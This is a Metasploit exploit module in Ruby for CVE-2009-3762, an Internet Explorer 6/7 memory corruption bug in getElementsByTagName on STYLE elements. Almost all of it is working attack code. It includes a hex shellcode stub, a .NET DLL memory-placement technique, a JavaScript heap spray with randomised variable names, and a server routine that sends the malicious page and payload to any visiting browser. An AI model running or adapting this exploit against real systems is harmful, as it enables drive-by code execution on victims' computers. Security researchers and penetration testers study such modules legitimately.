##
# $Id: ie_style_getelementsbytagname.rb 7609 2009-11-25 07:25:04Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "7.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
		:rank       => NormalRanking  # reliable memory corruption
	})


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Internet Explorer Style getElementsByTagName Memory Corruption',
			'Description'    => %q{
				This module exploits a vulnerability in the getElementsByTagName function 
			as implemented within Internet Explorer. 
			
			In order to execute code reliably, this module uses the .NET DLL
			memory technique pioneered by Alexander Sotirov and Mark Dowd. This method is
			used to create shellcode in memory at a known location.
			
			Since the .text segment of the .NET DLL is non-writable, a
			prefixed code stub is used to copy the payload into a new memory segment and
			continue execution from there.
			
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'securitylab.ir <K4mr4n_st[at]yahoo.com>',
					'jduck'
				],
			'Version'        => '$Revision: 7609 $',
			'References'     =>
				[
					['CVE', '2009-3762'],
					['OSVDB', '50622'],
					['BID', '37085'],
					['URL', 'http://www.microsoft.com/technet/security/advisory/977981.mspx'],
					['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,

					# Temporary stub virtualalloc() + memcpy() payload to RWX page
					'PrependEncoder' =>
						"\xe8\x56\x00\x00\x00\x53\x55\x56\x57\x8b\x6c\x24\x18\x8b\x45\x3c"+
						"\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x32"+
						"\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38\xe0\x74\x07"+
						"\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1\x8b\x5a\x24"+
						"\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8"+
						"\xeb\x02\x31\xc0\x5f\x5e\x5d\x5b\xc2\x08\x00\x5e\x6a\x30\x59\x64"+
						"\x8b\x19\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x5b\x08\x53\x68\x54"+
						"\xca\xaf\x91\xff\xd6\x6a\x40\x5e\x56\xc1\xe6\x06\x56\xc1\xe6\x08"+
						"\x56\x6a\x00\xff\xd0\x89\xc3\xeb\x0d\x5e\x89\xdf\xb9\xe8\x03\x00"+
						"\x00\xfc\xf3\xa4\xff\xe3\xe8\xee\xff\xff\xff"
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Nov 20 2009',
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)
		@state ||= {}
		
		# windows vista IE7 addr (mshtml.dll 7.0.6001.18203)
		ibase = 0x501d8000

		uri,token = request.uri.split('?', 2)


		if(token)
			token,trash = token.split('=')
		end

		if !(token and @state[token])

			print_status("Sending #{self.name} init HTML to #{cli.peerhost}:#{cli.peerport}...")
			token = rand_text_numeric(32)
			if ("/" == get_resource[-1].chr)
				dll_uri = get_resource[0, get_resource.length - 1]
			else
				dll_uri = get_resource
			end
			dll_uri << "/generic-" + Time.now.to_i.to_s + ".dll"

			html  = %Q|<html>
<head>
<script language="javascript">
	function forward() {
		window.location = window.location + '?#{token}';
	}

	function start() {
		setTimeout("forward()", 2000);
	}
</script>
</head>
<body onload="start()">
	<object classid="#{dll_uri}?#{token}"}#GenericControl">
	<object>
</body>
</html>
|
			@state[token] = :start
			# Transmit the compressed response to the client
			send_response(cli, html, { 'Content-Type' => 'text/html' })
			return
		end

		if (uri.match(/\.dll/i))

			return if ((p = regenerate_payload(cli)) == nil)

			# just nops/shellcode
			dll_data = make_nops(1024) * 31
			dll_data << p.encoded

			dotnetmem = Rex::Text.to_dotnetmem(ibase, dll_data)
			
			print_status("Sending #{dotnetmem.length} byte DLL to #{cli.peerhost}:#{cli.peerport}...")

			send_response(
				cli,
				dotnetmem,
				{
					'Content-Type' => 'application/x-msdownload',
					'Connection'   => 'close',
					'Pragma'       => 'no-cache'
				}
			)
			@state[token] = :dll
			return
		end


		print_status("Sending exploit HTML to #{cli.peerhost}:#{cli.peerport} token=#{@state[token]}...")

		#
		# .NET DLL MODE
		#
		if(@state[token] == :dll)

			var_start     = rand_text_alpha(rand(100) + 1)
			
			html = %Q|<!DOCTYPE>
<head>
<script language=javascript>
function #{var_start}(){ document.getElementsByTagName('STYLE')[0].outerHTML++; }
</script>
<STYLE>* { margin: 0; overflow: scroll }</STYLE>
<BODY ONLOAD="#{var_start}()">
</body>
</html>
|

		#
		# HEAP SPRAY MODE
		#
		else
			print_status("Heap spray mode")

			var_memory    = rand_text_alpha(rand(100) + 1)
			var_boom      = rand_text_alpha(rand(100) + 1)
			var_body      = rand_text_alpha(rand(100) + 1)
			var_unescape  = rand_text_alpha(rand(100) + 1)
			var_shellcode = rand_text_alpha(rand(100) + 1)
			var_spray     = rand_text_alpha(rand(100) + 1)
			var_start     = rand_text_alpha(rand(100) + 1)
			var_i         = rand_text_alpha(rand(100) + 1)
			
			html = %Q|<!DOCTYPE>
<head>
<script language=javascript>
function #{var_boom}(){ document.getElementsByTagName('STYLE')[0].outerHTML++; }
function #{var_body}(){
var #{var_unescape} = unescape;
var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');
var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "c" + "%u" + "0" + "c" + "0" + "c" );
var hs = 20;
var ss = hs + #{var_shellcode}.length;
while (#{var_spray}.length < ss) #{var_spray}+=#{var_spray};
fb = #{var_spray}.substring(0,ss)
bk = #{var_spray}.substring(0,#{var_spray}.length-ss);
while(bk.length+ss < 0x100000) bk = bk+bk+fb;
var #{var_memory} = new Array();
for (x=0;x<1285;x++) #{var_memory}[x]=bk+#{var_shellcode};
#{var_boom}();
}
</script>
<STYLE>* { margin: 0; overflow: scroll }</STYLE>
<BODY ONLOAD="#{var_body}()">
</body>
</html>
|
		end

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end


